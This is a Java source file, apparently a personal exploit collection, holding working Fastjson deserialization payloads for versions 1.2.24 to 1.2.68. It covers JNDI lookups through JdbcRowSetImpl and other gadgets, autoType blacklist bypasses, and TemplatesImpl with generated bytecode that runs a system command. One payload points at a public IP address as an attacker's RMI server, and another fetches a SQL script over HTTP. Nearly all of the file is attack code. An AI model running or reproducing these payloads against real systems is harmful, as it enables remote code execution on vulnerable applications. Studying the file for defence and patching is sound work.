package com.pinger.javasec.fastjson;

import cn.hutool.core.net.URLDecoder;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.pinger.javasec.common.CC2;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * @author : p1n93r
 * @date : 2021/8/2 15:43
 */
public class Attack {
    /**
     * version<= 1.2.24
     */
    public static void exp1(){
        String exp="{\n" +
                "  \"test\": {\n" +
                "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";
        JSON.parse(exp);
    }

    /**
     * 1.2.22<=version<= 1.2.24,且需要开启Feature.SupportNonPublicField
      */
    public static void exp2()throws Exception{
        String exp="{\n" +
                "  \"test\": {\n" +
                "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "    \"_bytecodes\": [\""+getEvalClassBytecodes()+"\"],\n" +
                "    \"_name\": \"p1n93r\",\n" +
                "    \"_tfactory\": {},\n" +
                "    \"_outputProperties\": {}\n" +
                "  }\n" +
                "}";
        JSON.parse(exp, Feature.SupportNonPublicField);
    }

    /**
     * 1.2.25<=version<=1.2.41
     * 1.2.25开始默认关闭了autotype支持
     * 此EXP : Bypass checkAutoType()中的黑白名单校验，但是还是需要开启autoType
     */
    public static void exp3()throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String exp="{\n" +
                "  \"test\": {\n" +
                "    \"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\n" +
                "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";
        JSON.parse(exp);
    }

    /**
     * version=1.2.42
     * 双写绕过1.2.25<=version<=1.2.41的修复，需要开启autoType
     */
    public static void exp4()throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String exp="{\n" +
                "  \"test\": {\n" +
                "    \"@type\": \"LLcom.sun.rowset.JdbcRowSetImpl;;\",\n" +
                "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";
        JSON.parse(exp);
    }

    /**
     * version=1.2.43
     * 使用 [ 字符绕过1.2.42的修复，需要开启autoType
     */
    public static void exp5()throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String exp = "{\"test\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true]}}";
        JSON.parse(exp);
    }

    /**
     * 1.2.44<=version<=1.2.45
     * 黑名单绕过，需要开启autoType
     */
    public static void exp6()throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String exp="{\"test\":{\"@type\":\"ch.qos.logback.core.db.DriverManagerConnectionSource\",\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8080/inject.sql'\"}}";
        //String exp="{\"test\":{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://127.0.0.1:1072/Shell\"}}";
        //String exp="{\"test\":{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://localhost:1389/test\"}}";
        //String exp="{\"test\": {\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1389/test\"], \"Realms\":[\"\"]}}";
        //String exp="{\"test\": {\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/test\"}}";
        //String exp="{\"test\": {\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/test\"}}}";
        //String exp="{\"test\":{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://localhost:1389/test\"}}}";
        //String exp="{\"test\":{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://localhost:1389/test\"}}}";
        Object parse = JSON.parse(exp);
        System.out.println(parse);
    }

    /**
     * 1.2.46 <= Version <= 1.2.47
     * 直接绕过autoType，不能开启autoType
     */
    public static void exp7()throws Exception{
        String exp="{\"test1\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"test2\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Object\",\"autoCommit\":true}}";
        Object parse = JSON.parse(exp);
        System.out.println(parse);
    }


    /**
     * Version = 1.2.68
     * 条件：未开启safeMode，且开启autoType
     */
    public static void exp8()throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //String exp="{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}";
        //String exp="{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}";
        //String exp="{\"@type\":\"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}";
        String exp="{\"@type\":\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}";
        Object parse = JSON.parse(exp);
        System.out.println(parse);
    }


    /**
     * 其他测试
     */
    public static void normal()throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String exp="{\n" +
                "  \"test\": {\n" +
                "    \"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\n" +
                "    \"dataSourceName\": \"rmi://49.234.105.98:1099/Exploit\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";
        System.out.println("::::::::::::::::Bypass_POC::::::::::::::::");
        System.out.println(exp);
        JSON.parse(exp);
    }


    public static void main(String[] args) throws Exception{
        normal();
    }



    /**
     * 需要一个空类作为javassist的模板
     */
    public static class Placeholder {}

    /**
     * 获取恶意字节码
     */
    public static String getEvalClassBytecodes()throws Exception{
        String abstractTransletClassPath = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

        // 使用javassist生成一个恶意的类
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(CC2.Placeholder.class));
        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));

        CtClass placeholder = classPool.get(CC2.Placeholder.class.getName());
        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
        placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"calc\");");
        placeholder.setName("EvalClass");
        // 得到恶意类的字节码
        byte[] evalByte = placeholder.toBytecode();
        return Base64.getEncoder().encodeToString(evalByte);
    }


}
